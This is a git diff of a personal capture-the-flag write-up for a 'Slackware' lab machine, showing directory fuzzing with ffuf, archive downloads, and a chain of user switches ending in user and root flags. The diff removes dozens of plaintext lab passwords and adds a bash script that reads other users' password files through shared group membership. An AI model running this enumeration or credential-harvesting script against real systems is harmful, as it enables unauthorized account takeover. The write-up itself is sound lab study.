@@ -1,4 +1,4 @@
-			ENUMERATION
+ENUMERATION
 
 			
 ---ifconfig---
@@ -169,12 +169,12 @@ robots.txt file, let's use it in the url and fuzz it---
 ┌──(root㉿kali)-[/home/okina]
 └─# ffuf -u "http://10.0.2.48:2/getslack/FUZZ.7z.001" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -fs 12
 
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
+        /'\  /'\           /'_\       
+       /\ \/ /\ \/  __  __  /\ \/       
+       \ \ ,\\ \ ,\/\ \/\ \ \ \ ,\      
+        \ \ \/ \ \ \/\ \ \\ \ \ \ \/      
+         \ \\   \ \\  \ \/  \ \_\       
+          \//    \//   \//    \//       
 
        v2.1.0-dev
 ________________________________________________
@@ -210,12 +210,12 @@ twitter                 [Status: 200, Size: 20480, Words: 84, Lines: 81, Duratio
 ┌──(root㉿kali)-[/home/okina]
 └─# ffuf -u "http://10.0.2.48:2/getslack/twitter.7z.FUZZ" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -fs 12
 
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
+        /'\  /'\           /'_\       
+       /\ \/ /\ \/  __  __  /\ \/       
+       \ \ ,\\ \ ,\/\ \/\ \ \ \ ,\      
+        \ \ \/ \ \ \/\ \ \\ \ \ \ \/      
+         \ \\   \ \\  \ \/  \ \_\       
+          \//    \//   \//    \//       
 
        v2.1.0-dev
 ________________________________________________
@@ -285,6 +285,17 @@ Saving to: ‘twitter.7z.014’
 twitter.7z.014             100%[=====================================>]   1.82K  --.-KB/s    in 0s      
 
 2024-05-04 19:02:21 (420 MB/s) - ‘twitter.7z.014’ saved [1860/1860]
+
+                                                                                                         
+┌──(root㉿kali)-[/home/okina/Desktop/NOTLAR/SLACKWARE LINUX CTF]
+└─# wget http://10.0.2.48:2/getslack/twitter.7z.015
+--2024-05-04 19:02:22--  http://10.0.2.48:2/getslack/twitter.7z.015
+Connecting to 10.0.2.48:2... connected.
+HTTP request sent, awaiting response... 404 Not Found
+2024-05-04 19:02:22 ERROR 404: Not Found.
+
+                                                
+---last one is cancelled because there is no such file, there are 14 files in total---
 
 
 
@@ -541,337 +552,54 @@ ex0XVRAAjCWX
 su alienum
 Password: 
 
-alienum@slackware:~$ id
-uid=1003(alienum) gid=1003(alienum) groups=1003(alienum),1004(mrmidnight)
-alienum@slackware:~$ cd /home/mrmidnight/
-alienum@slackware:/home/mrmidnight$ cat mypass.txt 
-B4ReHPEhmlPt
 
-alienum@slackware:/home/mrmidnight$ su mrmidnight
-Password: 
+.
+.
+.
+.
+.
+.
+.
+.
+.
 
-mrmidnight@slackware:~$ id
-uid=1004(mrmidnight) gid=1004(mrmidnight) groups=1004(mrmidnight),1005(annlynn)
-mrmidnight@slackware:~$ cd /home/annlynn/
-mrmidnight@slackware:/home/annlynn$ cat mypass.txt 
-S64IamSERUI3
 
-mrmidnight@slackware:/home/annlynn$ su annlynn
-Password: 
 
-annlynn@slackware:~$ id
-uid=1005(annlynn) gid=1005(annlynn) groups=1005(annlynn),1006(powerful)
-annlynn@slackware:~$ cd /home/powerful/
-annlynn@slackware:/home/powerful$ cat mypass.txt 
-pof2XIpVzYl3
+---I wrote a bash script that automatizes the changing user phase a little bit---
 
-annlynn@slackware:/home/powerful$ su powerful
-Password: 
+patrick@slackware:~$ cat checkpasswd.sh 
+#!/bin/bash
 
-powerful@slackware:~$ id
-uid=1006(powerful) gid=1006(powerful) groups=1006(powerful),1007(proxy)
-powerful@slackware:~$ cd /home/proxy
-powerful@slackware:/home/proxy$ cat mypass.txt 
-GX2xnNNU2Hcc
+# Get the current user
+current_user=$(whoami)
 
-powerful@slackware:/home/proxy$ su proxy
-Password: 
+# Iterate through each user's home directory
+for user_home in /home/*; do
+    # Get the username from the home directory path
+    username=$(basename "$user_home")
+    
+    # Check if the user is different from the current user
+    if [ "$username" != "$current_user" ]; then
+        # Check if the current user shares the same group with the user
+        if groups "$current_user" | grep -q "$username"; then
+            # Display the contents of the user's password file
+            echo "Password for user $username:"
+            cat "$user_home/mypass.txt"  # Assuming password file is named password.txt
+            echo ""
+        fi
+    fi
+done
 
-proxy@slackware:~$ id
-uid=1007(proxy) gid=1007(proxy) groups=1007(proxy),1008(x4v1l0k)
-proxy@slackware:~$ cd /home/x4v1l0k/
-proxy@slackware:/home/x4v1l0k$ cat mypass.txt 
-TB7pVPwPUeIW
 
-proxy@slackware:/home/x4v1l0k$ su x4v1l0k
-Password: 
 
-x4v1l0k@slackware:~$ id
-uid=1008(x4v1l0k) gid=1008(x4v1l0k) groups=1008(x4v1l0k),1009(icex64)
-x4v1l0k@slackware:~$ cat /home/icex64/mypass.txt
-tX5o7AUg2PTd
+---I gave it permissions rwx by everyone so when we run it it shows us the password of the user that is in the
+same id group as our current user. Then you switch to that user while staying in /home/patrick directory.
+You can check user's home directories to find if they have anything else beside mypass.txt file---
 
-x4v1l0k@slackware:~$ su icex64
-Password: 
 
-icex64@slackware:/home/x4v1l0k$ id
-uid=1009(icex64) gid=1009(icex64) groups=1009(icex64),1010(mindsflee)
-icex64@slackware:/home/x4v1l0k$ cat /home/mindsflee/mypass.txt
-VZFoxk0lqnnc
 
-icex64@slackware:/home/x4v1l0k$ su mindsflee
-Password: 
 
-mindsflee@slackware:/home/x4v1l0k$ id
-uid=1010(mindsflee) gid=1010(mindsflee) groups=1010(mindsflee),1011(zacarx007)
-mindsflee@slackware:/home$ cat /home/zacarx007/mypass.txt
-8LCa5IDAELR4
-
-mindsflee@slackware:/home$ su zacarx007
-Password: 
-
-zacarx007@slackware:/home$ id
-uid=1011(zacarx007) gid=1011(zacarx007) groups=1011(zacarx007),1012(terminal)
-zacarx007@slackware:/home$ cat /home/terminal/mypass.txt
-Qv0dtvZdfpvN
-
-zacarx007@slackware:/home$ su terminal
-Password: 
-
-terminal@slackware:/home$ id
-uid=1012(terminal) gid=1012(terminal) groups=1012(terminal),1013(zenmpi)
-terminal@slackware:/home$ cat /home/zenmpi/mypass.txt
-WiEbQP6K4Sg9
-
-terminal@slackware:/home$ su zenmpi
-Password: 
-
-zenmpi@slackware:/home$ id
-uid=1013(zenmpi) gid=1013(zenmpi) groups=1013(zenmpi),1014(sml)
-zenmpi@slackware:/home$ cat /home/sml/mypass.txt
-AQewY20VryO7
-
-zenmpi@slackware:/home$ su sml
-Password: 
-
-sml@slackware:/home$ id
-uid=1014(sml) gid=1014(sml) groups=1014(sml),1015(emvee)
-sml@slackware:/home$ cat /home/emvee/mypass.txt
-sj5mu74Nmowb
-
-sml@slackware:/home$ su emvee
-Password: 
-
-emvee@slackware:/home$ id
-uid=1015(emvee) gid=1015(emvee) groups=1015(emvee),1016(nls)
-emvee@slackware:/home$ cat /home/nls/mypass.txt
-VfS9EIU5C9xw
-
-emvee@slackware:/home$ su nls
-Password: 
-
-nls@slackware:/home$ id
-uid=1016(nls) gid=1016(nls) groups=1016(nls),1017(noname)
-nls@slackware:/home$ cat /home/noname/mypass.txt
-0Vsok2PoVo7t
-
-nls@slackware:/home$ su noname
-Password: 
-
-noname@slackware:/home$ id
-uid=1017(noname) gid=1017(noname) groups=1017(noname),1018(nolose)
-noname@slackware:/home$ cat /home/nolose/mypass.txt
-KcHXtRsiUPpw
-
-noname@slackware:/home$ su nolose
-Password: 
-
-nolose@slackware:/home$ id
-uid=1018(nolose) gid=1018(nolose) groups=1018(nolose),1019(sancelisso)
-nolose@slackware:/home$ cat /home/sancelisso/mypass.txt
-oAGSK1zXcbT8
-
-nolose@slackware:/home$ su sancelisso
-Password: 
-
-sancelisso@slackware:/home$ id
-uid=1019(sancelisso) gid=1019(sancelisso) groups=1019(sancelisso),1020(ruycr4ft)
-sancelisso@slackware:/home$ cat /home/ruycr4ft/mypass.txt
-G5UJEpW78pOV
-
-sancelisso@slackware:/home$ su ruycr4ft
-Password: 
-
-ruycr4ft@slackware:/home$ id
-uid=1020(ruycr4ft) gid=1020(ruycr4ft) groups=1020(ruycr4ft),1021(tasiyanci)
-ruycr4ft@slackware:/home$ cat /home/tasiyanci/mypass.txt
-JO8dvF60MdXR
-
-ruycr4ft@slackware:/home$ su tasiyanci
-Password: 
-
-tasiyanci@slackware:/home$ id
-uid=1021(tasiyanci) gid=1021(tasiyanci) groups=1021(tasiyanci),1022(lanz)
-tasiyanci@slackware:/home$ cat /home/lanz/mypass.txt
-IBrVGveXM3jI
-
-tasiyanci@slackware:/home$ su lanz
-Password: 
-
-lanz@slackware:/home$ id
-uid=1022(lanz) gid=1022(lanz) groups=1022(lanz),1023(pylon)
-lanz@slackware:/home$ cat /home/pylon/mypass.txt
-6Mqoo8Pud4Fx
-
-lanz@slackware:/home$ su pylon
-Password: 
-
-pylon@slackware:/home$ id
-uid=1023(pylon) gid=1023(pylon) groups=1023(pylon),1024(wwfymn)
-pylon@slackware:/home$ cat /home/wwfymn/mypass.txt
-VBebiyG62uIg
-
-pylon@slackware:/home$ su wwfymn
-Password: 
-
-wwfymn@slackware:/home$ id
-uid=1024(wwfymn) gid=1024(wwfymn) groups=1024(wwfymn),1025(whitecr0wz)
-wwfymn@slackware:/home$ cat /home/whitecr0wz/mypass.txt
-51BwJ9iYO4E7
-
-wwfymn@slackware:/home$ su whitecr0wz
-Password: 
-
-whitecr0wz@slackware:/home$ id
-uid=1025(whitecr0wz) gid=1025(whitecr0wz) groups=1025(whitecr0wz),1026(bit)
-whitecr0wz@slackware:/home$ cat /home/bit/mypass.txt
-fDZRz4SJOs8z
-
-whitecr0wz@slackware:/home$ su bit
-Password: 
-
-bit@slackware:/home$ id
-uid=1026(bit) gid=1026(bit) groups=1026(bit),1027(infayerts)
-bit@slackware:/home$ cat /home/infayerts/mypass.txt
-NYURcD5V8k4X
-
-bit@slackware:/home$ su infayerts
-Password: 
-
-infayerts@slackware:/home$ id
-uid=1027(infayerts) gid=1027(infayerts) groups=1027(infayerts),1028(rijaba1)
-infayerts@slackware:/home$ cat /home/rijaba1/mypass.txt
-eaqz8vJ2pRmU
-
-infayerts@slackware:/home$ su rijaba1
-Password: 
-
-rijaba1@slackware:/home$ id
-uid=1028(rijaba1) gid=1028(rijaba1) groups=1028(rijaba1),1029(cromiphi)
-rijaba1@slackware:/home$ cat /home/cromiphi/mypass.txt
-CQBpV2NQ3U6A
-
-rijaba1@slackware:/home$ su cromiphi
-Password: 
-
-cromiphi@slackware:/home$ id
-uid=1029(cromiphi) gid=1029(cromiphi) groups=1029(cromiphi),1030(gatogamer)
-cromiphi@slackware:/home$ cat /home/gatogamer/mypass.txt
-yjwGMry82S2Y
-
-cromiphi@slackware:/home$ su gatogamer
-Password: 
-
-gatogamer@slackware:/home$ id
-uid=1030(gatogamer) gid=1030(gatogamer) groups=1030(gatogamer),1031(ch4rm)
-gatogamer@slackware:/home$ cat /home/ch4rm/mypass.txt
-Hz35MslshyXj
-
-gatogamer@slackware:/home$ su ch4rm
-Password: 
-
-ch4rm@slackware:~$ id
-uid=1031(ch4rm) gid=1031(ch4rm) groups=1031(ch4rm),1032(aceomn)
-ch4rm@slackware:~$ cat /home/aceomn/mypass.txt
-sXdnu8wF1Yb8
-
-ch4rm@slackware:~$ su aceomn
-Password: 
-
-aceomn@slackware:/home/ch4rm$ id
-uid=1032(aceomn) gid=1032(aceomn) groups=1032(aceomn),1033(kerszi)
-aceomn@slackware:/home/ch4rm$ cat /home/kerszi/mypass.txt
-rjDwcHDFYBML
-
-aceomn@slackware:/home/ch4rm$ su kerszi
-Password: 
-
-kerszi@slackware:/home/ch4rm$ id
-uid=1033(kerszi) gid=1033(kerszi) groups=1033(kerszi),1034(d3b0o)
-kerszi@slackware:/home/ch4rm$ cat /home/d3b0o/mypass.txt
-oHjylQ7402Dd
-
-kerszi@slackware:/home/ch4rm$ su d3b0o
-Password: 
-
-d3b0o@slackware:/home$ id
-uid=1034(d3b0o) gid=1034(d3b0o) groups=1034(d3b0o),1035(avijneyam)
-d3b0o@slackware:/home$ cat avijneyam/mypass.txt
-vRdS8PLTnTlW
-
-d3b0o@slackware:/home$ su avijneyam
-Password: 
-
-avijneyam@slackware:/home$ id
-uid=1035(avijneyam) gid=1035(avijneyam) groups=1035(avijneyam),1036(zayotic)
-avijneyam@slackware:/home$ cat zayotic/mypass.txt
-bgg9TT9otdD6
-
-avijneyam@slackware:/home$ su zayotic
-Password: 
-
-zayotic@slackware:/home$ id
-uid=1036(zayotic) gid=1036(zayotic) groups=1036(zayotic),1037(kaian)
-zayotic@slackware:/home$ cat kaian/mypass.txt
-R23AJFVTQYaB
-
-zayotic@slackware:/home$ su kaian
-Password: 
-
-kaian@slackware:/home$ id
-uid=1037(kaian) gid=1037(kaian) groups=1037(kaian),1038(c4rta)
-kaian@slackware:/home$ cat c4rta/mypass.txt
-IAuaOSSTZHoh
-
-kaian@slackware:/home$ su c4rta
-Password: 
-
-c4rta@slackware:/home$ id
-uid=1038(c4rta) gid=1038(c4rta) groups=1038(c4rta),1039(boyras200)
-c4rta@slackware:/home$ cat boyras200/mypass.txt
-oW19TzLywNIq
-
-c4rta@slackware:/home$ su boyras200
-Password: 
-
-
-boyras200@slackware:/home$ id
-uid=1039(boyras200) gid=1039(boyras200) groups=1039(boyras200),1040(waidroc)
-boyras200@slackware:/home$ cat waidroc/mypass.txt
-0aApTUf5E2Eq
-
-boyras200@slackware:/home$ su waidroc
-Password: 
-
-waidroc@slackware:/home$ id
-uid=1040(waidroc) gid=1040(waidroc) groups=1040(waidroc),1041(ziyos)
-waidroc@slackware:/home$ cat ziyos/mypass.txt
-8eS8I1JGxeeZ
-
-waidroc@slackware:/home$ su ziyos
-Password: 
-
-ziyos@slackware:/home$ id
-uid=1041(ziyos) gid=1041(ziyos) groups=1041(ziyos),1042(b4el7d)
-ziyos@slackware:/home$ cat b4el7d/mypass.txt
-llMttpVCiYPw
-
-ziyos@slackware:/home$ su b4el7d
-Password: 
-
-b4el7d@slackware:/home$ id
-uid=1042(b4el7d) gid=1042(b4el7d) groups=1042(b4el7d),1043(rpj7)
-b4el7d@slackware:/home$ cat rpj7/mypass.txt
-wP26CtkDby6J
-
-b4el7d@slackware:/home$ su rpj7
-Password: 
-
-rpj7@slackware:/home$ cd rpj7
-rpj7@slackware:~$ ls
-mypass.txt  user.txt
 rpj7@slackware:~$ cat user.txt
-    	      		
 ---First User Flag---
 
 
@@ -881,35 +609,15 @@ it seems---
 
 
 
-
----now let's keep on checking for another clue in order to priv escalate---
-
+---now let's keep on checking other user's folders for another clue in order to priv escalate---
 
 
-rpj7@slackware:~$ id
-uid=1043(rpj7) gid=1043(rpj7) groups=1043(rpj7),1044(h1dr0)
-rpj7@slackware:~$ cat /home/h1dr0/mypass.txt
-tnvAny2zwYTV
+.
+.
+.
+.
+.
 
-rpj7@slackware:~$ su h1dr0
-Password: 
-
-
-h1dr0@slackware:/home$ id
-uid=1044(h1dr0) gid=1044(h1dr0) groups=1044(h1dr0),1045(catch_me75)
-h1dr0@slackware:/home$ cat catch_me75/mypass.txt
-Vkyo6rKvXsIw
-
-h1dr0@slackware:/home$ su catch_me75
-Password: 
-
-catch_me75@slackware:/home$ id
-uid=1045(catch_me75) gid=1045(catch_me75) groups=1045(catch_me75),1046(josemlwdf)
-catch_me75@slackware:/home$ cat josemlwdf/mypass.txt
-jLzXNEEFdtLX
-
-catch_me75@slackware:/home$ su josemlwdf
-Password: 
 
 josemlwdf@slackware:/home$ id
 uid=1046(josemlwdf) gid=1046(josemlwdf) groups=1046(josemlwdf),1047(skinny)
@@ -929,7 +637,7 @@ mypass.txt
 
 ---seems like skinny is the last user of the chain, so we are done with searching the user directories---
 
-Note: We should find a way to automatize this process though
+Updated Note: I did find a way to automatize this process a little bit
 
 
 
@@ -1006,3 +714,6 @@ There is no root flag here, but it is somewhere in the /home directory.
 
 root@slackware:/home# grep -ri 'root'
 0xh3rshel/.screenrc:# Here is a flag for root: ---Root User Flag---
+
+
+---Congrats, we finished this ctf too---
